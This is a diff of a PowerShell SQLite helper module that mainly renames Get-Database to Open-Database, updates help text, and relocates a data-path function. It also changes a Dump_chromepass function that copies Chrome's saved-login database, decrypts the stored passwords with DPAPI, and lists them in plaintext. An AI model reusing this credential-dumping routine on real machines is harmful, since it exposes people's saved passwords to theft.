@@ -412,7 +412,7 @@ class Database {
         } Catch {
             # if the database cannot be opened, throw an exception
             # there are many different reasons why opening the database may fail. Here are some:
-            # - the database file does not exist (should be validated by Get-Database)
+            # - the database file does not exist (should be validated by Open-Database)
             # - the user has no write permission to the database file
             #   - it may reside in a restricted place, i.e. the c:\ root folder
             #   - it may be locked by another application
@@ -701,6 +701,43 @@ class Table {
     # TODO: add method to query this table
 }
 
+function Get-DataPath {
+    [CmdletBinding()]
+    [OutputType([System.IO.DirectoryInfo])]
+    param (
+        [Parameter(Mandatory = $true, Position = 0)]
+        [ValidateNotNullOrEmpty()]
+        [string]$appName,
+
+        [Parameter(Mandatory = $true, Position = 1)]
+        [ValidateNotNullOrEmpty()]
+        [string]$SubdirName,
+
+        [switch]$DontCreate
+    )
+
+    process {
+        $_Host_OS = Get-HostOs
+        $dataPath = if ($_Host_OS -eq 'Windows') {
+            [System.IO.DirectoryInfo]::new([IO.Path]::Combine($Env:HOME, "AppData", "Roaming", $appName, $SubdirName))
+        } elseif ($_Host_OS -in ('Linux', 'MacOs')) {
+            [System.IO.DirectoryInfo]::new([IO.Path]::Combine((($env:PSModulePath -split [IO.Path]::PathSeparator)[0] | Split-Path | Split-Path), $appName, $SubdirName))
+        } elseif ($_Host_OS -eq 'Unknown') {
+            try {
+                [System.IO.DirectoryInfo]::new([IO.Path]::Combine((($env:PSModulePath -split [IO.Path]::PathSeparator)[0] | Split-Path | Split-Path), $appName, $SubdirName))
+            } catch {
+                Write-Warning "Could not resolve chat data path"
+                Write-Warning "HostOS = '$_Host_OS'. Could not resolve data path."
+                [System.IO.Directory]::CreateTempSubdirectory(($SubdirName + 'Data-'))
+            }
+        } else {
+            throw [InvalidOperationException]::new('Could not resolve data path. Get-HostOS FAILED!')
+        }
+        if (!$dataPath.Exists -and !$DontCreate.IsPresent) { New-Directory -Path $dataPath.FullName }
+        return $dataPath
+    }
+}
+
 function New-Database {
     [CmdletBinding()]
     [OutputType([Database])]
@@ -714,7 +751,7 @@ function New-Database {
     }
 }
 
-function Get-Database {
+function Open-Database {
     #   .SYNOPSIS
     #   Returns a database object representing a SQLite database.
     #   The database object provides all properties and methods to
@@ -725,20 +762,20 @@ function Get-Database {
     #   supply the database object to this function
 
     #   .EXAMPLE
-    #   $db = Get-Database
+    #   $db = New-Database
     #   returns a memory-based database
 
     #   .EXAMPLE
-    #   $db = Get-Database -Path $env:temp\test.db
+    #   $db = Open-Database -Path $env:temp\test.db
     #   Opens the file-based database. If the file does not exist, a new database file is created
 
     #   .EXAMPLE
-    #   $db = Get-Database -Path c:\data\database1.db
+    #   $db = Open-Database -Path c:\data\database1.db
     #   $db.GetTables()
     #   opens the file-based database and lists the tables found in the database
 
     #   .EXAMPLE
-    #   $db = Get-Database -Path c:\data\database1.db
+    #   $db = Open-Database -Path c:\data\database1.db
     #   $db.InvokeSQL('Select * from customers')
     #   runs the SQL statement and queries all records from the table "customers".
     #   The table "customers" must exist.
@@ -761,67 +798,63 @@ function Get-Database {
 }
 
 function Import-Database {
-    #       .SYNOPSIS
-    #       Imports new data to a database table. Data can be added to existing or new tables.
-    #       Use Get-Database to get a database first.
-    #       .DETAILS
-    #       Import-Database automatically examines incoming objects and creates the
-    #       table definition required to store these objects. The first object received
-    #       by Import-Database determines the table layout.
-    #       If the specified table already exists, Import-Database checks whether the existing
-    #       table has fields for all object properties.
-
-    #       .EXAMPLE
-    #       $db = Get-Database
-    #       Get-Service | Import-Database -Database $db -Table Services
-    #       $db.InvokeSql('Select * From Services') | Out-GridView
-    #       creates a memory-based database, then pipes all services into the database
-    #       and stores them in a new table called "Services"
-    #       Next, the table content is queried via Sql and the result displays in a gridview
-    #       Note that the database content is lost once PowerShell ends
-
-    #       .EXAMPLE
-    #       $db = Get-Database -Path $env:temp\temp.db
-    #       Get-Service | Import-Database -Database $db -Table Services
-    #       $db.InvokeSql('Select * From Services') | Out-GridView
-    #       opens the file-based database in $env:temp\temp.db, and if the file does not exist,
-    #       a new file is created. All services are piped into the database
-    #       and stored in a table called "Services".
-    #       If the table "Services" exists already, the data is appended to the table, else
-    #       a new table is created.
-    #       Next, the table content is queried via Sql and the result displays in a gridview
-    #       Since the database is file-based, all content imported to the database is stored
-    #       in the file specified.
-
-    #       .EXAMPLE
-    #       $db = Get-Database -Path $env:temp\temp.db
-    #       $db.QueryTimeout = 6000
-    #       Get-ChildItem -Path c:\ -Recurse -ErrorAction SilentlyContinue -File |
-    #       Import-Database -Database $db -Table Files
-    #       Writes all files on drive C:\ to table "Files". Since this operation may take a long
-    #       time, the database "QueryTimeout" property is set to 6000 seconds (100 min)
-    #       A better way is to split up data insertion into multiple chunks that execute
-    #       faster. This can be achieved via -TransactionSet. This parameter specifies the
-    #       chunk size (number of objects) that should be imported before a new transaction
-    #       starts.
-
-    #       .EXAMPLE
-    #       $db = Get-Database -Path $home\Documents\myDatabase.db
-    #       Get-ChildItem -Path $home -Recurse -File -ErrorAction SilentlyContinue |
-    #       Import-Database -Database $db -Table FileList -UseUnsafePerformanceTricks -LockDatabase -TransactionSet 10000
-    #       $db.InvokeSql('Select * From FileList Where Extension=".log" Order By "Length"') | Out-GridView
-    #       A file-based database is opened. If the file does not yet exist, it is created.
-    #       Next, all files from the current user profile are collected by Get-ChildItem,
-    #       and written to the database table "FileList". If the table exists, the data is
-    #       appended, else the table is created.
-    #       Next, the table "FileList" is queried by Sql, and all files with extension ".log"
-    #       display in a gridview ordered by file size
-    #       To improve performance, Import-Database temporarily locks the database and turns off
-    #       database features that normally improve robustness in the event of a crash.
-    #       By turning off these features, performance is increased considerably at the expense
-    #       of data corruption.
+    # .SYNOPSIS
+    # Imports new data to a database table. Data can be added to existing or new tables.
+    # Use Open-Database to get a database first.
+    # .DETAILS
+    # Import-Database automatically examines incoming objects and creates the
+    # table definition required to store these objects. The first object received
+    # by Import-Database determines the table layout.
+    # If the specified table already exists, Import-Database checks whether the existing
+    # table has fields for all object properties.
+    # .EXAMPLE
+    # $db = Open-Database
+    # Get-Service | Import-Database -Database $db -Table Services
+    # $db.InvokeSql('Select * From Services') | Out-GridView
+    # creates a memory-based database, then pipes all services into the database
+    # and stores them in a new table called "Services"
+    # Next,the table content is queried via Sql and the result displays in a gridview
+    # Note that the database content is lost once PowerShell ends
+    # .EXAMPLE
+    # $db = Open-Database -Path $env:temp\temp.db
+    # Get-Service | Import-Database -Database $db -Table Services
+    # $db.InvokeSql('Select * From Services') | Out-GridView
+    # opens the file-based database in $env:temp\temp.db, and if the file does not exist,
+    # a new file is created. All services are piped into the database
+    # and stored in a table called "Services".
+    # If the table "Services" exists already, the data is appended to the table, else
+    # a new table is created.
+    # Next,the table content is queried via Sql and the result displays in a gridview
+    # Since the database is file-based, all content imported to the database is stored
+    # In the file specified.
+    # .EXAMPLE
+    # $db = Open-Database -Path $env:temp\temp.db
+    # $db.QueryTimeout = 6000
+    # Get-ChildItem -Path c:\ -Recurse -ErrorAction SilentlyContinue -File |
+    #     Import-Database -Database $db -Table Files
+    # Writes all files on drive C:\ to table "Files". Since this operation may take a long
+    # time,the database "QueryTimeout" property is set to 6000 seconds (100 min)
+    # A better way is to split up data insertion into multiple chunks that execute
+    # faster. This can be achieved via -TransactionSet. This parameter specifies the
+    # chunk size (number of objects) that should be imported before a new transaction
+    # starts.
+    # .EXAMPLE
+    # $db = Open-Database -Path $home\Documents\myDatabase.db
+    # Get-ChildItem -Path $home -Recurse -File -ErrorAction SilentlyContinue |
+    #     Import-Database -Database $db -Table FileList -UseUnsafePerformanceTricks -LockDatabase -TransactionSet 10000
+    # $db.InvokeSql('Select * From FileList Where Extension=".log" Order By "Length"') | Out-GridView
+    # A file-based database is opened. If the file does not yet exist, it is created.
+    # Next,all files from the current user profile are collected by Get-ChildItem,
+    # and written to the database table "FileList". If the table exists, the data is
+    # appended,else the table is created.
+    # Next,the table "FileList" is queried by Sql, and all files with extension ".log"
+    # display in a gridview ordered by file size
+    # To improve performance, Import-Database temporarily locks the database and turns off
+    # Get-database features that normally improve robustness in the event of a crash.
+    # By turning off these features, performance is increased considerably at the expense
+    # of data corruption.
     param (
-        # Database object returned by Get-Database
+        # Database object returned by Open-Database
         [Parameter(Mandatory = $true)]
         [Database]$Database,
 
@@ -1428,79 +1461,28 @@ function New-Directory {
     }
 }
 
-function Get-DataPath {
-    [CmdletBinding()]
-    [OutputType([System.IO.DirectoryInfo])]
-    param (
-        [Parameter(Mandatory = $true, Position = 0)]
-        [ValidateNotNullOrEmpty()]
-        [string]$appName,
-
-        [Parameter(Mandatory = $true, Position = 1)]
-        [ValidateNotNullOrEmpty()]
-        [string]$SubdirName,
-
-        [switch]$DontCreate
-    )
-
-    process {
-        $_Host_OS = Get-HostOs
-        $dataPath = if ($_Host_OS -eq 'Windows') {
-            [System.IO.DirectoryInfo]::new([IO.Path]::Combine($Env:HOME, "AppData", "Roaming", $appName, $SubdirName))
-        } elseif ($_Host_OS -in ('Linux', 'MacOs')) {
-            [System.IO.DirectoryInfo]::new([IO.Path]::Combine((($env:PSModulePath -split [IO.Path]::PathSeparator)[0] | Split-Path | Split-Path), $appName, $SubdirName))
-        } elseif ($_Host_OS -eq 'Unknown') {
-            try {
-                [System.IO.DirectoryInfo]::new([IO.Path]::Combine((($env:PSModulePath -split [IO.Path]::PathSeparator)[0] | Split-Path | Split-Path), $appName, $SubdirName))
-            } catch {
-                Write-Warning "Could not resolve chat data path"
-                Write-Warning "HostOS = '$_Host_OS'. Could not resolve data path."
-                [System.IO.Directory]::CreateTempSubdirectory(($SubdirName + 'Data-'))
-            }
-        } else {
-            throw [InvalidOperationException]::new('Could not resolve data path. Get-HostOS FAILED!')
-        }
-        if (!$dataPath.Exists -and !$DontCreate.IsPresent) { New-Directory -Path $dataPath.FullName }
-        return $dataPath
-    }
-}
-
 function Dump_chromepass {
     [CmdletBinding()]
     param ()
     process {
+        Add-Type -AssemblyName System.Security
         # default path to Chrome user passwords database:
-        $Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        # check whether database exists:
-        $exists = Test-Path -Path $path -PathType Leaf
-        # if it is missing, then you might not be using the Google Chrome browser:
-        if (!$exists) {
+        $Path = [IO.Path]::Combine("$env:LOCALAPPDATA", "Google", "Chrome", "User Data", "Default", "Login Data")
+        if (![IO.File]::Exists($Path)) {
             Write-Warning "No Chrome Database found."
             return
         }
-
-        # define function to decrypt encrypted text
-        function Unprotect-Secret($value) {
-            Add-Type -AssemblyName System.Security
-            $bytes = [System.Security.Cryptography.ProtectedData]::Unprotect($value, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-            [System.Text.Encoding]::Default.GetString($bytes)
-        }
-
         # copy the database (the original file is locked while Chrome is running):
-        $Destination = "$env:temp\database.db"
+        $Destination = [IO.Path]::Combine($env:temp, "chrome_data.db")
         Copy-Item -Path $Path -Destination $Destination
-
         # query to retrieve the cached passwords:
         $sql = "SELECT action_url, username_value, password_value FROM logins"
-
-        #region define calculated properties
         # rename column headers:
         $url = @{N = 'Url'; E = { $_.action_url } }
         $username = @{N = 'Username'; E = { $_.username_value } }
-        $password = @{N = 'Password'; E = { Unprotect-Secret -Secret $_.password_value } }
-        #endregion define calculated properties
+        $password = @{N = 'Password'; E = { [System.Text.Encoding]::Default.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($_.password_value, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)) } }
 
-        $db = Get-Database -Path $Destination
+        $db = Open-Database -Path $Destination
         $db.InvokeSql($sql) | Select-Object $url, $username, $password
     }
 }
